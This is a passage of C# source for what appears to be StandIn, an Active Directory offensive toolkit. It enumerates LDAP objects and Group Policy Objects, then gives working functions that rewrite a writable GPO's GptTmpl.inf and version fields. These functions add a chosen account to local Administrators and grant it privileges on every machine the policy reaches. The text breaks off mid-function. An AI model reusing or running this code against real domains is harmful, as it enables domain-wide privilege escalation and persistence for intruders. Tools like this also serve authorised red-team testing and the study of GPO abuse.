using System;
using CommandLine;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.DirectoryServices.Protocols;
using System.DirectoryServices.AccountManagement;
using System.Net;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Security.Cryptography;

namespace StandIn
{
    class Program
    {
        public static void returnObject(String sObject, String sDomain = "", String sUser = "", String sPass = "", String sFilter = "")
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Search filter
            ds.Filter = sObject;

            // Enum
            try
            {
                // Search
                SearchResultCollection oObject = ds.FindAll();

                // Did we get 1 result back?
                if (oObject.Count == 0)
                {
                    Console.WriteLine("[!] Object not found..");
                    return;
                } else if (oObject.Count > 1)
                {
                    Console.WriteLine("[!] Invalid search, multiple results returned..");
                    return;
                }

                // Get object details
                foreach (SearchResult sr in oObject)
                {
                    DirectoryEntry mde = sr.GetDirectoryEntry();
                    Console.WriteLine("[?] Object   : " + mde.Name);
                    Console.WriteLine("    Path     : " + mde.Path);

                    // retrieve object properties
                    ResultPropertyCollection omProps = sr.Properties;
                    List<String> lFilterProperties = new List<String>();
                    if (!String.IsNullOrEmpty(sFilter))
                    {
                        Console.WriteLine("\n[?] Iterating object properties");
                        Console.WriteLine("    |_ Applying property filter => " + sFilter + "\n");
                        Array.ForEach(sFilter.Split(','), e => lFilterProperties.Add(e.Trim()));
                    } else
                    {
                        Console.WriteLine("\n[?] Iterating object properties\n");
                    }
                    foreach (String sKey in omProps.PropertyNames)
                    {
                        if (lFilterProperties.Count > 0)
                        {
                            if (!lFilterProperties.Contains(sKey))
                            {
                                continue;
                            }
                        }

                        Console.WriteLine("[+] " + sKey);
                        if (sKey == "objectsid")
                        {
                            Console.WriteLine("    |_ " + new SecurityIdentifier((Byte[])omProps[sKey][0], 0).ToString());
                        }
                        else if (sKey == "objectguid")
                        {
                            Console.WriteLine("    |_ " + new Guid((Byte[])omProps[sKey][0]).ToString());
                        }
                        else if (
                            sKey == "pwdlastset" ||
                            sKey == "lastlogon" ||
                            sKey == "lastlogontimestamp" ||
                            sKey == "accountexpires" ||
                            sKey == "lastLogoff" ||
                            sKey == "badpasswordtime")
                        {
                            long kerbTime = (long)omProps[sKey][0];
                            if (kerbTime == long.MaxValue)
                            {
                                Console.WriteLine("    |_ 0x7FFFFFFFFFFFFFFF");
                            } else if (kerbTime == 0)
                            {
                                Console.WriteLine("    |_ 0x0");
                            } else
                            {
                                Console.WriteLine("    |_ " + DateTime.FromFileTimeUtc((long)omProps[sKey][0]) + " UTC");
                            }
                        }
                        else if (sKey == "msds-allowedtoactonbehalfofotheridentity")
                        {
                            RawSecurityDescriptor rsd = new RawSecurityDescriptor((Byte[])omProps[sKey][0], 0);
                            foreach (CommonAce ace in rsd.DiscretionaryAcl)
                            {
                                Console.WriteLine("    |_ BinLen           : " + ace.BinaryLength);
                                Console.WriteLine("    |_ AceQualifier     : " + ace.AceQualifier.ToString());
                                Console.WriteLine("    |_ IsCallback       : " + ace.IsCallback);
                                Console.WriteLine("    |_ OpaqueLength     : " + ace.OpaqueLength);
                                Console.WriteLine("    |_ AccessMask       : " + ace.AccessMask);
                                Console.WriteLine("    |_ SID              : " + ace.SecurityIdentifier.ToString());
                                Console.WriteLine("    |_ AceType          : " + ace.AceType.ToString());
                                Console.WriteLine("    |_ AceFlags         : " + ace.AceFlags);
                                Console.WriteLine("    |_ IsInherited      : " + ace.IsInherited);
                                Console.WriteLine("    |_ InheritanceFlags : " + ace.InheritanceFlags);
                                Console.WriteLine("    |_ PropagationFlags : " + ace.PropagationFlags);
                                Console.WriteLine("    |_ AuditFlags       : " + ace.AceFlags);
                            }
                        }
                        else if (sKey == "useraccountcontrol")
                        {
                            try
                            {
                                Console.WriteLine("    |_ " + (hStandIn.USER_ACCOUNT_CONTROL)omProps[sKey][0]);
                            } catch
                            {
                                Console.WriteLine("    |_ " + omProps[sKey][0]);
                            }
                        }
                        else if (sKey == "samaccounttype")
                        {
                            try
                            {
                                Console.WriteLine("    |_ " + (hStandIn.SAM_ACCOUNT_TYPE)omProps[sKey][0]);
                            }
                            catch
                            {
                                Console.WriteLine("    |_ " + omProps[sKey][0]);
                            }
                        }
                        else if (sKey == "msds-supportedencryptiontypes")
                        {
                            try
                            {
                                Console.WriteLine("    |_ " + (hStandIn.SUPPORTED_ETYPE)omProps[sKey][0]);
                            }
                            catch
                            {
                                Console.WriteLine("    |_ " + omProps[sKey][0]);
                            }
                        }
                        else if (sKey == "versionnumber")
                        {
                            try
                            {
                                hStandIn.GPOVersion gpov = hStandIn.UInt32ToGPOVersion((UInt32)Int32.Parse(omProps[sKey][0].ToString()));
                                Console.WriteLine("    |_ User Version     : " + gpov.iUserVersion);
                                Console.WriteLine("    |_ Computer Version : " + gpov.iComputerVersion);
                            }
                            catch
                            {
                                Console.WriteLine("    |_ " + omProps[sKey][0]);
                            }
                        }
                        else
                        {
                            foreach (Object oColl in omProps[sKey])
                            {
                                if (oColl is byte[])
                                {
                                    Console.WriteLine("    |_ " + BitConverter.ToString((Byte[])oColl).Replace("-", " "));
                                }
                                else
                                {
                                    Console.WriteLine("    |_ " + oColl);
                                }
                            }
                        }
                    }
                }

            } catch
            {
                Console.WriteLine("[!] Failed to enumerate object properties..");
                return;
            }
        }

        public static void returnLDAP(String sLDAP, String sDomain = "", String sUser = "", String sPass = "", String sFilter = "", UInt32 iLimit = 0)
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Search filter
            ds.Filter = sLDAP;

            // Enum
            try
            {
                // Search
                SearchResultCollection oObject = ds.FindAll();

                // Did we get at least 1 result back?
                if (oObject.Count == 0)
                {
                    Console.WriteLine("[!] LDAP search did not return any results..");
                    return;
                }

                // Search details
                if (iLimit == 0)
                {
                    // If unspecified == 50
                    iLimit = 50;
                }
                Console.WriteLine("[+] LDAP search result count : " + oObject.Count);
                Console.WriteLine("    |_ Result limit          : " + iLimit);

                List<String> lFilterProperties = new List<String>();
                if (!String.IsNullOrEmpty(sFilter))
                {
                    Console.WriteLine("\n[?] Iterating result properties");
                    Console.WriteLine("    |_ Applying property filter => " + sFilter);
                    Array.ForEach(sFilter.Split(','), e => lFilterProperties.Add(e.Trim()));
                }
                else
                {
                    Console.WriteLine("\n[?] Iterating result properties");
                }

                // Get object details
                foreach (SearchResult sr in oObject)
                {
                    DirectoryEntry mde = sr.GetDirectoryEntry();
                    Console.WriteLine("\n[?] Object   : " + mde.Name);
                    Console.WriteLine("    Path     : " + mde.Path);

                    // retrieve object properties
                    ResultPropertyCollection omProps = sr.Properties;
                    foreach (String sKey in omProps.PropertyNames)
                    {
                        if (lFilterProperties.Count > 0)
                        {
                            if (!lFilterProperties.Contains(sKey))
                            {
                                continue;
                            }
                        }

                        Console.WriteLine("[+] " + sKey);
                        if (sKey == "objectsid")
                        {
                            Console.WriteLine("    |_ " + new SecurityIdentifier((Byte[])omProps[sKey][0], 0).ToString());
                        }
                        else if (sKey == "objectguid")
                        {
                            Console.WriteLine("    |_ " + new Guid((Byte[])omProps[sKey][0]).ToString());
                        }
                        else if (
                            sKey == "pwdlastset" ||
                            sKey == "lastlogon" ||
                            sKey == "lastlogontimestamp" ||
                            sKey == "accountexpires" ||
                            sKey == "lastLogoff" ||
                            sKey == "badpasswordtime")
                        {
                            long kerbTime = (long)omProps[sKey][0];
                            if (kerbTime == long.MaxValue)
                            {
                                Console.WriteLine("    |_ 0x7FFFFFFFFFFFFFFF");
                            }
                            else if (kerbTime == 0)
                            {
                                Console.WriteLine("    |_ 0x0");
                            }
                            else
                            {
                                Console.WriteLine("    |_ " + DateTime.FromFileTimeUtc((long)omProps[sKey][0]) + " UTC");
                            }
                        }
                        else if (sKey == "msds-allowedtoactonbehalfofotheridentity")
                        {
                            RawSecurityDescriptor rsd = new RawSecurityDescriptor((Byte[])omProps[sKey][0], 0);
                            foreach (CommonAce ace in rsd.DiscretionaryAcl)
                            {
                                Console.WriteLine("    |_ BinLen           : " + ace.BinaryLength);
                                Console.WriteLine("    |_ AceQualifier     : " + ace.AceQualifier.ToString());
                                Console.WriteLine("    |_ IsCallback       : " + ace.IsCallback);
                                Console.WriteLine("    |_ OpaqueLength     : " + ace.OpaqueLength);
                                Console.WriteLine("    |_ AccessMask       : " + ace.AccessMask);
                                Console.WriteLine("    |_ SID              : " + ace.SecurityIdentifier.ToString());
                                Console.WriteLine("    |_ AceType          : " + ace.AceType.ToString());
                                Console.WriteLine("    |_ AceFlags         : " + ace.AceFlags);
                                Console.WriteLine("    |_ IsInherited      : " + ace.IsInherited);
                                Console.WriteLine("    |_ InheritanceFlags : " + ace.InheritanceFlags);
                                Console.WriteLine("    |_ PropagationFlags : " + ace.PropagationFlags);
                                Console.WriteLine("    |_ AuditFlags       : " + ace.AceFlags);
                            }
                        }
                        else if (sKey == "useraccountcontrol")
                        {
                            try
                            {
                                Console.WriteLine("    |_ " + (hStandIn.USER_ACCOUNT_CONTROL)omProps[sKey][0]);
                            }
                            catch
                            {
                                Console.WriteLine("    |_ " + omProps[sKey][0]);
                            }
                        }
                        else if (sKey == "samaccounttype")
                        {
                            try
                            {
                                Console.WriteLine("    |_ " + (hStandIn.SAM_ACCOUNT_TYPE)omProps[sKey][0]);
                            }
                            catch
                            {
                                Console.WriteLine("    |_ " + omProps[sKey][0]);
                            }
                        }
                        else if (sKey == "msds-supportedencryptiontypes")
                        {
                            try
                            {
                                Console.WriteLine("    |_ " + (hStandIn.SUPPORTED_ETYPE)omProps[sKey][0]);
                            }
                            catch
                            {
                                Console.WriteLine("    |_ " + omProps[sKey][0]);
                            }
                        }
                        else if (sKey == "versionnumber")
                        {
                            try
                            {
                                hStandIn.GPOVersion gpov = hStandIn.UInt32ToGPOVersion((UInt32)Int32.Parse(omProps[sKey][0].ToString()));
                                Console.WriteLine("    |_ User Version     : " + gpov.iUserVersion);
                                Console.WriteLine("    |_ Computer Version : " + gpov.iComputerVersion);
                            }
                            catch
                            {
                                Console.WriteLine("    |_ " + omProps[sKey][0]);
                            }
                        }
                        else
                        {
                            foreach (Object oColl in omProps[sKey])
                            {
                                if (oColl is byte[])
                                {
                                    Console.WriteLine("    |_ " + BitConverter.ToString((Byte[])oColl).Replace("-", " "));
                                }
                                else
                                {
                                    Console.WriteLine("    |_ " + oColl);
                                }
                            }
                        }
                    }

                    // Should we exit?
                    iLimit -= 1;
                    if (iLimit == 0)
                    {
                        break;
                    }
                }
            }
            catch
            {
                Console.WriteLine("[!] Failed to run LDAP query..");
                return;
            }
        }

        public static void returnGPOs(String sDomain = "", String sUser = "", String sPass = "", String sFilter = "", UInt32 iLimit = 0, Boolean bACL = false)
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Search filter
            if (String.IsNullOrEmpty(sFilter))
            {
                ds.Filter = "(&(displayName=*)(gpcfilesyspath=*))";
            } else
            {
                ds.Filter = String.Format("(&(gpcfilesyspath=*)(|(displayName=*{0}*)(displayName={0}*)(displayName=*{0})))", sFilter);
            }

            // Enum
            try
            {
                // Search
                SearchResultCollection oObject = ds.FindAll();

                // Did we get at least 1 result back?
                if (oObject.Count == 0)
                {
                    Console.WriteLine("[!] LDAP search did not return any results..");
                    return;
                }

                // Search details
                if (iLimit == 0)
                {
                    // If unspecified == 50
                    iLimit = 50;
                }
                Console.WriteLine("[+] GPO result count         : " + oObject.Count);
                Console.WriteLine("    |_ Result limit          : " + iLimit);
                if (!String.IsNullOrEmpty(sFilter))
                {
                    Console.WriteLine("    |_ Applying search filter");
                }

                // Get object details
                foreach (SearchResult sr in oObject)
                {
                    DirectoryEntry mde = sr.GetDirectoryEntry();
                    ResultPropertyCollection omProps = sr.Properties;

                    Console.WriteLine("\n[?] Object   : " + mde.Name);
                    Console.WriteLine("    Path     : " + mde.Path);

                    if (bACL)
                    {
                        Console.WriteLine("    GPCFilesysPath : " + omProps["gpcfilesyspath"][0].ToString());
                        if (Directory.Exists(omProps["gpcfilesyspath"][0].ToString()))
                        {
                            Console.WriteLine("    Path           : OK");
                            try
                            {
                                DirectoryInfo di = new DirectoryInfo(omProps["gpcfilesyspath"][0].ToString());
                                DirectorySecurity dse = di.GetAccessControl(AccessControlSections.Access);
                                foreach (FileSystemAccessRule fsar in dse.GetAccessRules(true, true, typeof(NTAccount)))
                                {
                                    Console.WriteLine("\n[+] Account       : " + fsar.IdentityReference.Value);
                                    Console.WriteLine("    Type          : " + fsar.AccessControlType);
                                    Console.WriteLine("    Rights        : " + fsar.FileSystemRights);
                                    Console.WriteLine("    Inherited ACE : " + fsar.IsInherited);
                                    Console.WriteLine("    Propagation   : " + fsar.PropagationFlags);
                                }
                            } catch
                            {
                                Console.WriteLine("    Error          : Access Denied");
                            }
                        } else
                        {
                            Console.WriteLine("    Path           : Not found");
                        }
                    } else
                    {
                        // retrieve object properties
                        Console.WriteLine("    DisplayName              : " + omProps["displayname"][0].ToString());
                        Console.WriteLine("    CN                       : " + omProps["cn"][0].ToString());
                        Console.WriteLine("    GPCFilesysPath           : " + omProps["gpcfilesyspath"][0].ToString());
                        try
                        {
                            Console.WriteLine("    GPCMachineExtensionnames : " + omProps["gpcmachineextensionnames"][0].ToString());
                        }
                        catch
                        {
                            Console.WriteLine("    GPCMachineExtensionnames : ");
                        }
                        Console.WriteLine("    WhenCreated              : " + omProps["whencreated"][0].ToString());
                        Console.WriteLine("    WhenChanged              : " + omProps["whenchanged"][0].ToString());
                    }
                    // Should we exit?
                    iLimit -= 1;
                    if (iLimit == 0)
                    {
                        break;
                    }
                }
            }
            catch
            {
                Console.WriteLine("[!] Failed to retrieve GPOs..");
                return;
            }
        }

        public static void GPONewLocalAdmin(String sGPOName, String sSamAccountName, String sDomain = "", String sUser = "", String sPass = "")
        {
            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Search filter
            ds.Filter = String.Format("(&(gpcfilesyspath=*)(displayName={0}))", sGPOName);

            // Enum
            try
            {
                // Search
                SearchResultCollection oObject = ds.FindAll();

                // Did we get at least 1 result back?
                if (oObject.Count == 0)
                {
                    Console.WriteLine("\n[!] LDAP search did not return any results..");
                    return;
                }
                else if (oObject.Count > 1)
                {
                    Console.WriteLine("\n[!] LDAP search returned more than one result..");
                    return;
                }

                SearchResult dirGPOObject = oObject[0];
                DirectoryEntry mde = dirGPOObject.GetDirectoryEntry();
                ResultPropertyCollection omProps = dirGPOObject.Properties;

                String sGPOPath = omProps["gpcfilesyspath"][0].ToString();
                Console.WriteLine("\n[+] GPO Object Found");
                Console.WriteLine("    Object   : " + mde.Name);
                Console.WriteLine("    Path     : " + mde.Path);
                Console.WriteLine("    GP Path  : " + sGPOPath);

                ds.Filter = String.Format("(samaccountname={0})", sSamAccountName);
                SearchResult userObject = null;
                try
                {
                    userObject = ds.FindOne();
                }
                catch
                {
                    Console.WriteLine("\n[!] LDAP search failed..");
                    return;
                }

                if (userObject == null)
                {
                    Console.WriteLine("\n[!] samAccountName did not resolve to identity..");
                    return;
                }
                DirectoryEntry umde = userObject.GetDirectoryEntry();
                ResultPropertyCollection uomProps = userObject.Properties;

                Console.WriteLine("\n[+] User Object Found");
                Console.WriteLine("    Object   : " + umde.Name);
                Console.WriteLine("    Path     : " + umde.Path);
                Console.WriteLine("    SID      : " + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString());

                // Read GPO version information
                hStandIn.GPOVersion oGPOVer = hStandIn.UInt32ToGPOVersion((UInt32)Int32.Parse(omProps["versionnumber"][0].ToString()));
                Console.WriteLine("\n[?] GPO Version");
                Console.WriteLine("    User     : " + oGPOVer.iUserVersion);
                Console.WriteLine("    Computer : " + oGPOVer.iComputerVersion);

                if (!Directory.Exists(sGPOPath))
                {
                    Console.WriteLine("\n[!] GPO path not found..");
                    return;
                }

                // Read gpt.ini
                String sGPT = File.ReadAllText(sGPOPath + @"\gpt.ini");
                UInt32 iNewGPOVersion = hStandIn.IncrementGPOVersion(oGPOVer, false, true);
                String sNewGPT = Regex.Replace(sGPT, @"(V|v)ersion=\d+", String.Format("Version={0}", iNewGPOVersion));

                // Check/create relevant path
                if (!Directory.Exists(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\"))
                {
                    try
                    {
                        Directory.CreateDirectory(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\");
                    }
                    catch
                    {
                        Console.WriteLine("\n[!] Failed to create GPO path..");
                        return;
                    }
                }

                Console.WriteLine("\n[+] Writing GPO changes");
                if (File.Exists(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf"))
                {
                    Console.WriteLine("    |_ Updating existing GptTmpl.inf");
                    String sTmpl = File.ReadAllText(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf");

                    // Create collection object
                    MatchCollection mc;

                    // Does it contain group membership info?
                    if ((sTmpl.ToLower()).Contains("[group membership]"))
                    {
                        Console.WriteLine("       |_ Updating group membership");
                        mc = Regex.Matches(sTmpl, @"\*(\s|)S-1-5-32-544__Members(\s|)=(.+)");
                        if (mc.Count == 1)
                        {
                            // Check if sid already contained or append?
                            if ((mc[0].Groups[3].Value).ToLower().Contains((new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString()).ToLower()))
                            {
                                Console.WriteLine("       |_ User SID alread part of local admins..");
                                return;
                            }
                            else
                            {
                                String sReplace = "*S-1-5-32-544__Members = *" + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString() + "," + (mc[0].Groups[3].Value).Trim() + "\r\n";
                                sTmpl = Regex.Replace(sTmpl, @"\*(\s|)S-1-5-32-544__Members(\s|)=(.+)", sReplace);
                            }
                        }
                        else
                        {
                            // Ok here we just add the group
                            String sReplace = "[Group Membership]\r\n" +
                                              "*S-1-5-32-544__Memberof =\r\n" +
                                              "*S-1-5-32-544__Members = *" + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString();
                            sTmpl = Regex.Replace(sTmpl, @"\[(G|g)roup (M|m)embership\]", sReplace);
                        }
                    }
                    else
                    {
                        Console.WriteLine("       |_ Adding group membership");
                        sTmpl = sTmpl +
                                "\r\n[Group Membership]\r\n" +
                                "*S-1-5-32-544__Memberof =\r\n" +
                                "*S-1-5-32-544__Members = *" + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString();
                    }

                    // Update revision
                    Console.WriteLine("       |_ Updating revision");
                    mc = Regex.Matches(sTmpl, @"(R|r)evision(\s|=)(\s|)(\d+)");
                    if (mc.Count == 1)
                    {
                        Int64 iRevision = Int64.Parse(mc[0].Groups[4].Value);
                        iRevision += 1;
                        sTmpl = Regex.Replace(sTmpl, @"(R|r)evision(\s|=)(\s|)\d+", String.Format("Revision={0}", iRevision));
                    }

                    File.WriteAllText(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf", sTmpl);
                }
                else
                {
                    Console.WriteLine("    |_ Creating GptTmpl.inf");
                    String sGptTemplate = "[Unicode]\r\n" +
                                          "Unicode=yes\r\n" +
                                          "[Version]\r\n" +
                                          "signature=\"$CHICAGO$\"\r\n" +
                                          "Revision=1\r\n" +
                                          "[Group Membership]\r\n" +
                                          "*S-1-5-32-544__Memberof =\r\n" +
                                          "*S-1-5-32-544__Members = *" + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString();

                    File.WriteAllText(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf", sGptTemplate);
                }

                Console.WriteLine("    |_ Updating gpt.inf");
                File.WriteAllText(sGPOPath + @"\gpt.ini", sNewGPT);
                Console.WriteLine("    |_ Updating AD object");
                Console.WriteLine("       |_ Incrementing version number");
                mde.Properties["versionNumber"].Value = (hStandIn.IncrementGPOVersion(oGPOVer, false, true)).ToString();

                // Does exist
                if (dirGPOObject.Properties.Contains("gPCMachineExtensionNames"))
                {
                    Console.WriteLine("       |_ Updating gPCMachineExtensionNames");
                    String sMachExt = omProps["gPCMachineExtensionNames"][0].ToString();
                    MatchCollection mc = Regex.Matches(sMachExt, @"\[{?[0-9a-fA-F-]{36}}{?[0-9a-fA-F-]{36}}\]");
                    if (mc.Count == 0)
                    {
                        mde.Properties["gPCMachineExtensionNames"].Value = sMachExt + "[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]";
                    }
                    else
                    {
                        List<String> lExt = new List<String>();
                        if (!sMachExt.Contains("[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]"))
                        {
                            lExt.Add("[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]");
                        }

                        lExt.Add(sMachExt);

                        // Build new string
                        String sNewMachExt = String.Empty;
                        foreach (String s in lExt)
                        {
                            sNewMachExt += s;
                        }
                        mde.Properties["gPCMachineExtensionNames"].Value = sNewMachExt;
                    }
                }
                else
                {
                    Console.WriteLine("       |_ Creating gPCMachineExtensionNames");
                    mde.Properties["gPCMachineExtensionNames"].Add("[{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]");
                }
                mde.CommitChanges();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Failed modify GPO..");
                if (ex.InnerException != null)
                {
                    Console.WriteLine(ex.InnerException.Message);
                }
                else
                {
                    Console.WriteLine(ex.Message);
                }
                return;
            }
        }

        public static void GPOAddUserRights(String sGPOName, String sSamAccountName, String sUserRights, String sDomain = "", String sUser = "", String sPass = "")
        {
            // Parse provided GPO rights
            Console.WriteLine("\n[+] Validating account rights");
            List<String> lUserRights = new List<String>();
            void addPrivilege(String sRight, String sIndex)
            {
                if (sRight.Trim().ToLower() == sIndex.ToLower()) {
                    lUserRights.Add(sIndex);
                }
            }

            foreach (String s in hStandIn.userTokenRights)
            {
                Array.ForEach(sUserRights.Split(','), e =>  addPrivilege(e, s));
            }

            if (lUserRights.Count == 0)
            {
                Console.WriteLine("\n[!] No valid user rights identified..");
                return;
            } else
            {
                Console.WriteLine("    |_ Rights count: " + lUserRights.Count);
                foreach (String s in lUserRights)
                {
                    Console.WriteLine("       |_ " + s);
                }
            }

            // Create searcher
            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
            if (!so.success)
            {
                Console.WriteLine("\n[!] Failed to create directory searcher..");
                return;
            }
            DirectorySearcher ds = so.searcher;

            // Search filter
            ds.Filter = String.Format("(&(gpcfilesyspath=*)(displayName={0}))", sGPOName);

            // Enum
            try
            {
                // Search
                SearchResultCollection oObject = ds.FindAll();

                // Did we get at least 1 result back?
                if (oObject.Count == 0)
                {
                    Console.WriteLine("\n[!] LDAP search did not return any results..");
                    return;
                } else if (oObject.Count > 1)
                {
                    Console.WriteLine("\n[!] LDAP search returned more than one result..");
                    return;
                }

                SearchResult dirGPOObject = oObject[0];
                DirectoryEntry mde = dirGPOObject.GetDirectoryEntry();
                ResultPropertyCollection omProps = dirGPOObject.Properties;

                String sGPOPath = omProps["gpcfilesyspath"][0].ToString();
                Console.WriteLine("\n[+] GPO Object Found");
                Console.WriteLine("    Object   : " + mde.Name);
                Console.WriteLine("    Path     : " + mde.Path);
                Console.WriteLine("    GP Path  : " + sGPOPath);

                ds.Filter = String.Format("(samaccountname={0})", sSamAccountName);
                SearchResult userObject = null;
                try
                {
                    userObject = ds.FindOne();
                } catch
                {
                    Console.WriteLine("\n[!] LDAP search failed..");
                    return;
                }
                
                if (userObject == null)
                {
                    Console.WriteLine("\n[!] samAccountName did not resolve to identity..");
                    return;
                }
                DirectoryEntry umde = userObject.GetDirectoryEntry();
                ResultPropertyCollection uomProps = userObject.Properties;

                Console.WriteLine("\n[+] User Object Found");
                Console.WriteLine("    Object   : " + umde.Name);
                Console.WriteLine("    Path     : " + umde.Path);
                Console.WriteLine("    SID      : " + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString());

                // Read GPO version information
                hStandIn.GPOVersion oGPOVer = hStandIn.UInt32ToGPOVersion((UInt32)Int32.Parse(omProps["versionnumber"][0].ToString()));
                Console.WriteLine("\n[?] GPO Version");
                Console.WriteLine("    User     : " + oGPOVer.iUserVersion);
                Console.WriteLine("    Computer : " + oGPOVer.iComputerVersion);

                if (!Directory.Exists(sGPOPath))
                {
                    Console.WriteLine("\n[!] GPO path not found..");
                    return;
                }

                // Read gpt.ini
                String sGPT = File.ReadAllText(sGPOPath + @"\gpt.ini");
                UInt32 iNewGPOVersion = hStandIn.IncrementGPOVersion(oGPOVer, false, true);
                String sNewGPT = Regex.Replace(sGPT, @"(V|v)ersion=\d+", String.Format("Version={0}", iNewGPOVersion));

                // Check/create relevant path
                if (!Directory.Exists(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\"))
                {
                    try
                    {
                        Directory.CreateDirectory(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\");
                    } catch
                    {
                        Console.WriteLine("\n[!] Failed to create GPO path..");
                        return;
                    }
                }

                Console.WriteLine("\n[+] Writing GPO changes");
                if (File.Exists(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf"))
                {
                    Console.WriteLine("    |_ Updating existing GptTmpl.inf");
                    String sTmpl = File.ReadAllText(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf");

                    // Create collection object
                    MatchCollection mc;

                    // Does it contain group membership info?
                    UInt32 iCount = 0;
                    if ((sTmpl.ToLower()).Contains("[privilege rights]"))
                    {
                        Console.WriteLine("       |_ Updating GPO Privileges");
                        // Loop rights
                        foreach (String sRight in lUserRights)
                        {
                            mc = Regex.Matches(sTmpl, @"(\s|)" + sRight + @"(\s|)=(.+)");
                            if (mc.Count == 1)
                            {
                                // Check if sid already contained or append?
                                if ((mc[0].Groups[3].Value).ToLower().Contains((new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString()).ToLower()))
                                {
                                    Console.WriteLine("       |_ User SID already has " + sRight + "..");
                                }
                                else
                                {
                                    String sReplace = sRight + " = *" + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString() + "," + (mc[0].Groups[3].Value).Trim() + "\r\n";
                                    sTmpl = Regex.Replace(sTmpl, @"(\s|)" + sRight + @"(\s|)=(.+)", sReplace);
                                    iCount += 1;
                                }
                            }
                            else
                            {
                                // Ok here we just add the priv
                                String sReplace = "[Privilege Rights]\r\n" +
                                                  sRight + " = *" + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString();
                                sTmpl = Regex.Replace(sTmpl, @"\[(P|p)rivilege (R|r)ights\]", sReplace);
                                iCount += 1;
                            }
                        }
                    } else
                    {
                        Console.WriteLine("       |_ Adding GPO Privileges");
                        sTmpl = sTmpl + "\r\n[Privilege Rights]\r\n";
                        foreach (String s in lUserRights)
                        {
                            sTmpl += s + " = *" + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString() + "\r\n";
                            iCount += 1;
                        }
                    }

                    // No new privileges were added
                    if (iCount == 0)
                    {
                        return;
                    }

                    // Update revision
                    Console.WriteLine("       |_ Updating revision");
                    mc = Regex.Matches(sTmpl, @"(R|r)evision(\s|=)(\s|)(\d+)");
                    if (mc.Count == 1)
                    {
                        Int64 iRevision = Int64.Parse(mc[0].Groups[4].Value);
                        iRevision += 1;
                        sTmpl = Regex.Replace(sTmpl, @"(R|r)evision(\s|=)(\s|)\d+", String.Format("Revision={0}", iRevision));
                    }

                    File.WriteAllText(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf", sTmpl);
                } else
                {
                    Console.WriteLine("    |_ Creating GptTmpl.inf");
                    String sGptTemplate = "[Unicode]\r\n" +
                                          "Unicode=yes\r\n" +
                                          "[Version]\r\n" +
                                          "signature=\"$CHICAGO$\"\r\n" +
                                          "Revision=1\r\n" +
                                          "[Privilege Rights]\r\n";
                    foreach (String s in lUserRights)
                    {
                        sGptTemplate += s + " = *" + new SecurityIdentifier((Byte[])uomProps["objectsid"][0], 0).ToString() + "\r\n";
                    }

                    File.WriteAllText(sGPOPath + @"\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf", sGptTemplate);
                }

                Console.WriteLine("    |_ Updating gpt.inf");
                File.WriteAllText(sGPOPath + @"\gpt.ini", sNewGPT);
                Console.WriteLine("    |_ Updating AD object");
                Console.WriteLine("       |_ Incrementing version number");
                mde.Properties["versionNumber"].Value = (hStandIn.IncrementGPOVersion(oGPOVer, false, true)).ToString();

                // Does exist
                if (dirGPOObject.Properties.Contains("gPCMachineExtensionNames"))
                {
                    Console.WriteLine("       |_ Updating gPCMachineExtensionNames");
                    String sMachExt = omProps["gPCMachineExtensionNames"][0].ToString();
                    MatchCollection mc = Regex.Matches(sMachExt, @"\[{?[0-9a-fA-F-]{36}}{?[0-9a-fA-F-]{36}}\]");
                    if (mc.Count == 0)
                    {
